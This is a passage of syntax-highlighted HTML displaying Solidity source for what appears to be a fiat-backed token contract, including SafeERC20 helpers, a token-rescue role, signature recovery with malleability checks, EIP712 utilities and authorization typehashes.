comment\">/**\n     * @dev Deprecated. This function has issues similar to the ones found in\n     * &#123;IERC20-approve&#125;, and its usage is discouraged.\n     *\n     * Whenever possible, use &#123;safeIncreaseAllowance&#125; and\n     * &#123;safeDecreaseAllowance&#125; instead.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">safeApprove</span><span class=\"token punctuation\">(</span>\n        IERC20 token<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> value\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// safeApprove should only be called when setting an initial allowance,</span>\n        <span class=\"token comment\">// or when resetting it to zero. To increase and decrease it, use</span>\n        <span class=\"token comment\">// 'safeIncreaseAllowance' and 'safeDecreaseAllowance'</span>\n        <span class=\"token comment\">// solhint-disable-next-line max-line-length</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            <span class=\"token punctuation\">(</span>value <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">allowance</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> spender<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"SafeERC20: approve from non-zero to non-zero allowance\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">_callOptionalReturn</span><span class=\"token punctuation\">(</span>\n            token<span class=\"token punctuation\">,</span>\n            abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSelector</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">.</span>approve<span class=\"token punctuation\">.</span>selector<span class=\"token punctuation\">,</span> spender<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">safeIncreaseAllowance</span><span class=\"token punctuation\">(</span>\n        IERC20 token<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> value\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint256</span> newAllowance <span class=\"token operator\">=</span> token<span class=\"token punctuation\">.</span><span class=\"token function\">allowance</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> spender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>\n            value\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">_callOptionalReturn</span><span class=\"token punctuation\">(</span>\n            token<span class=\"token punctuation\">,</span>\n            abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSelector</span><span class=\"token punctuation\">(</span>\n                token<span class=\"token punctuation\">.</span>approve<span class=\"token punctuation\">.</span>selector<span class=\"token punctuation\">,</span>\n                spender<span class=\"token punctuation\">,</span>\n                newAllowance\n            <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">safeDecreaseAllowance</span><span class=\"token punctuation\">(</span>\n        IERC20 token<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> value\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint256</span> newAllowance <span class=\"token operator\">=</span> token<span class=\"token punctuation\">.</span><span class=\"token function\">allowance</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> spender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>\n            value<span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"SafeERC20: decreased allowance below zero\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">_callOptionalReturn</span><span class=\"token punctuation\">(</span>\n            token<span class=\"token punctuation\">,</span>\n            abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSelector</span><span class=\"token punctuation\">(</span>\n                token<span class=\"token punctuation\">.</span>approve<span class=\"token punctuation\">.</span>selector<span class=\"token punctuation\">,</span>\n                spender<span class=\"token punctuation\">,</span>\n                newAllowance\n            <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement\n     * on the return value: the return value is optional (but if data is returned, it must not be false).\n     * @param token The token targeted by the call.\n     * @param data The call data (encoded using abi.encode or one of its variants).\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_callOptionalReturn</span><span class=\"token punctuation\">(</span>IERC20 token<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> data<span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since</span>\n        <span class=\"token comment\">// we're implementing it ourselves. We use &#123;Address.functionCall&#125; to perform this call, which verifies that</span>\n        <span class=\"token comment\">// the target address contains contract code and also asserts for success in the low-level call.</span>\n\n        <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> returndata <span class=\"token operator\">=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">functionCall</span><span class=\"token punctuation\">(</span>\n            data<span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"SafeERC20: low-level call failed\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>returndata<span class=\"token punctuation\">.</span>length <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token comment\">// Return data is optional</span>\n            <span class=\"token comment\">// solhint-disable-next-line max-line-length</span>\n            <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n                abi<span class=\"token punctuation\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span>returndata<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"SafeERC20: ERC20 operation did not succeed\"</span>\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Rescuable</span> <span class=\"token keyword\">is</span> Ownable <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeERC20</span> <span class=\"token keyword\">for</span> IERC20<span class=\"token punctuation\">;</span>\n\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">private</span> _rescuer<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">event</span> <span class=\"token function\">RescuerChanged</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> newRescuer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Returns current rescuer\n     * @return Rescuer's address\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">rescuer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> _rescuer<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Revert if called by any account other than the rescuer.\n     */</span>\n    <span class=\"token keyword\">modifier</span> <span class=\"token function\">onlyRescuer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> _rescuer<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Rescuable: caller is not the rescuer\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Rescue ERC20 tokens locked up in this contract.\n     * @param tokenContract ERC20 token contract address\n     * @param to        Recipient address\n     * @param amount    Amount to withdraw\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">rescueERC20</span><span class=\"token punctuation\">(</span>\n        IERC20 tokenContract<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> amount\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> onlyRescuer <span class=\"token punctuation\">&#123;</span>\n        tokenContract<span class=\"token punctuation\">.</span><span class=\"token function\">safeTransfer</span><span class=\"token punctuation\">(</span>to<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Assign the rescuer role to a given address.\n     * @param newRescuer New rescuer's address\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">updateRescuer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> newRescuer<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> onlyOwner <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            newRescuer <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Rescuable: new rescuer is the zero address\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        _rescuer <span class=\"token operator\">=</span> newRescuer<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">RescuerChanged</span><span class=\"token punctuation\">(</span>newRescuer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">FiatTokenV1_1</span> <span class=\"token keyword\">is</span> FiatTokenV1<span class=\"token punctuation\">,</span> Rescuable <span class=\"token punctuation\">&#123;</span>\n\n<span class=\"token punctuation\">&#125;</span>\n\n\nabstract <span class=\"token keyword\">contract</span> <span class=\"token class-name\">AbstractFiatTokenV2</span> <span class=\"token keyword\">is</span> AbstractFiatTokenV1 <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_increaseAllowance</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> owner<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> increment\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> virtual<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_decreaseAllowance</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> owner<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> decrement\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> virtual<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">library</span> <span class=\"token class-name\">ECRecover</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">/**\n     * @notice Recover signer's address from a signed message\n     * @dev Adapted from: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/65e4ffde586ec89af3b7e9140bdc9235d1254853/contracts/cryptography/ECDSA.sol\n     * Modifications: Accept v, r, and s as separate arguments\n     * @param digest    Keccak-256 hash digest of the signed message\n     * @param v         v of the signature\n     * @param r         r of the signature\n     * @param s         s of the signature\n     * @return Signer address\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">recover</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">bytes32</span> digest<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint8</span> v<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> r<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> s\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// EIP-2 still allows signature malleability for ecrecover(). Remove this possibility and make the signature</span>\n        <span class=\"token comment\">// unique. Appendix F in the Ethereum Yellow paper (https://ethereum.github.io/yellowpaper/paper.pdf), defines</span>\n        <span class=\"token comment\">// the valid range for s in (281): 0 &lt; s &lt; secp256k1n ÷ 2 + 1, and for v in (282): v ∈ &#123;27, 28&#125;. Most</span>\n        <span class=\"token comment\">// signatures from current libraries generate a unique signature with an s-value in the lower half order.</span>\n        <span class=\"token comment\">//</span>\n        <span class=\"token comment\">// If your library generates malleable signatures, such as s-values in the upper range, calculate a new s-value</span>\n        <span class=\"token comment\">// with 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 - s1 and flip v from 27 to 28 or</span>\n        <span class=\"token comment\">// vice versa. If your library also generates signatures with 0/1 for v instead 27/28, add 27 to v to accept</span>\n        <span class=\"token comment\">// these malleable signatures as well.</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>\n            <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span>\n            <span class=\"token number\">0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0</span>\n        <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">revert</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ECRecover: invalid signature 's' value\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>v <span class=\"token operator\">!=</span> <span class=\"token number\">27</span> <span class=\"token operator\">&amp;&amp;</span> v <span class=\"token operator\">!=</span> <span class=\"token number\">28</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">revert</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ECRecover: invalid signature 'v' value\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token comment\">// If the signature is valid (and not malleable), return the signer address</span>\n        <span class=\"token builtin\">address</span> signer <span class=\"token operator\">=</span> <span class=\"token function\">ecrecover</span><span class=\"token punctuation\">(</span>digest<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>signer <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ECRecover: invalid signature\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">return</span> signer<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// File: contracts/util/EIP712.sol</span>\n\n<span class=\"token comment\">/**\n * License: MIT\n *\n * Copyright (c) 2018-2020 CENTRE SECZ\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n * SOFTWARE.\n */</span>\n\n\n\n<span class=\"token comment\">/**\n * @title EIP712\n * @notice A library that provides EIP712 helper functions\n */</span>\n<span class=\"token keyword\">library</span> <span class=\"token class-name\">EIP712</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">/**\n     * @notice Make EIP712 domain separator\n     * @param name      Contract name\n     * @param version   Contract version\n     * @return Domain separator\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">makeDomainSeparator</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> name<span class=\"token punctuation\">,</span> <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> version<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">internal</span>\n        <span class=\"token keyword\">view</span>\n        <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint256</span> chainId<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">&#123;</span>\n            chainId <span class=\"token operator\">:=</span> <span class=\"token function\">chainid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span>\n            <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>\n                abi<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>\n                    <span class=\"token number\">0x8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token comment\">// = keccak256(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\")</span>\n                    <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>version<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    chainId<span class=\"token punctuation\">,</span>\n                    <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Recover signer's address from a EIP712 signature\n     * @param domainSeparator   Domain separator\n     * @param v                 v of the signature\n     * @param r                 r of the signature\n     * @param s                 s of the signature\n     * @param typeHashAndData   Type hash concatenated with data\n     * @return Signer's address\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">recover</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">bytes32</span> domainSeparator<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint8</span> v<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> r<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> s<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> typeHashAndData\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">bytes32</span> digest <span class=\"token operator\">=</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>\n            abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>\n                <span class=\"token string\">\"\\x19\\x01\"</span><span class=\"token punctuation\">,</span>\n                domainSeparator<span class=\"token punctuation\">,</span>\n                <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>typeHashAndData<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> ECRecover<span class=\"token punctuation\">.</span><span class=\"token function\">recover</span><span class=\"token punctuation\">(</span>digest<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// File: contracts/v2/EIP712Domain.sol</span>\n\n<span class=\"token comment\">/**\n * License: MIT\n *\n * Copyright (c) 2018-2020 CENTRE SECZ\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n * SOFTWARE.\n */</span>\n\n\n<span class=\"token comment\">/**\n * @title EIP712 Domain\n */</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">EIP712Domain</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">/**\n     * @dev EIP712 Domain Separator\n     */</span>\n    <span class=\"token builtin\">bytes32</span> <span class=\"token keyword\">public</span> DOMAIN_SEPARATOR<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\nabstract <span class=\"token keyword\">contract</span> <span class=\"token class-name\">GasAbstraction</span> <span class=\"token keyword\">is</span> AbstractFiatTokenV2<span class=\"token punctuation\">,</span> EIP712Domain <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">bytes32</span>\n        <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> TRANSFER_WITH_AUTHORIZATION_TYPEHASH <span class=\"token operator\">=</span> <span class=\"token number\">0x7c7c6cdb67a18743f49ec6fa9b35f50d52ed05cbed4cc592e13b44501c1a2267</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// = keccak256(\"TransferWithAuthorization(address from,address to,uint256 value,uint256 validAfter,uint256 validBefore,bytes32 nonce)\")</span>\n    <span class=\"token builtin\">bytes32</span>\n        <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> APPROVE_WITH_AUTHORIZATION_TYPEHASH <span class=\"token operator\">=</span> <span class=\"token number\">0x808c10407a796f3ef2c7ea38c0638ea9d2b8a1c63e3ca9e1f56ce84ae59df73c</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// = keccak256(\"ApproveWithAuthorization(address owner,address spender,uint256 value,uint256 validAfter,uint256 validBefore,bytes32 nonce)\")</span>\n    <span class=\"token builtin\">bytes32</span>\n        <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> INCREASE_ALLOWANCE_WITH_AUTHORIZATION_TYPEHASH <span class=\"token operator\">=</span> <span class=\"token number\">0x424222bb050a1f7f14017232a5671f2680a2d3420f504bd565cf03035c53198a</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// = keccak256(\"IncreaseAllowanceWithAuthorization(address owner,address spender,uint256 increment,uint256 validAfter,uint256 validBefore,bytes32 nonce)\")</span>\n    <span class=\"token builtin\">bytes32</span>\n        <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> DECREASE_ALLOWANCE_WITH_AUTHORIZATION_TYPEHASH <span class=\"token operator\">=</span> <span class=\"token number\">0xb70559e94cbda91958ebec07f9b65b3b490097c8d25c8dacd71105df1015b6d8</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// = keccak256(\"DecreaseAllowanceWithAuthorization(address owner,address spender,uint256 decrement,uint256 validAfter,uint256 validBefore,bytes32 nonce)\")</span>\n    <span class=\"token builtin\">bytes32</span>\n        <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> CANCEL_AUTHORIZATION_TYPEHASH <span class=\"token operator\">=</span> <span class=\"token number\">0x158b0a9edf7a828aad02f63cd515c68ef2f50ba807396f6d12842833a1597429</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// = keccak256(\"CancelAuthorization(address authorizer,bytes32 nonce)\")</span>\n\n    <span class=\"token keyword\">enum</span> <span class=\"token class-name\">AuthorizationState</span> <span class=\"token punctuation\">&#123;</span> Unused<span class=\"token punctuation\">,</span> Used<span class=\"token punctuation\">,</span> Canceled <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev authorizer address => nonce => authorization state\n     */</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span> <span class=\"token operator\">=></span> AuthorizationState<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">private</span> _authorizationStates<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">event</span> <span class=\"token function\">AuthorizationUsed</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> authorizer<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes32</span> <span class=\"token keyword\">indexed</span> nonce<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">AuthorizationCanceled</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> authorizer<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> <span class=\"token keyword\">indexed</span> nonce\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/**\n     * @notice Returns the state of an authorization\n     * @param authorizer    Authorizer's address\n     * @param nonce         Nonce of the authorization\n     * @return Authorization state\n     */</span>\n    <span 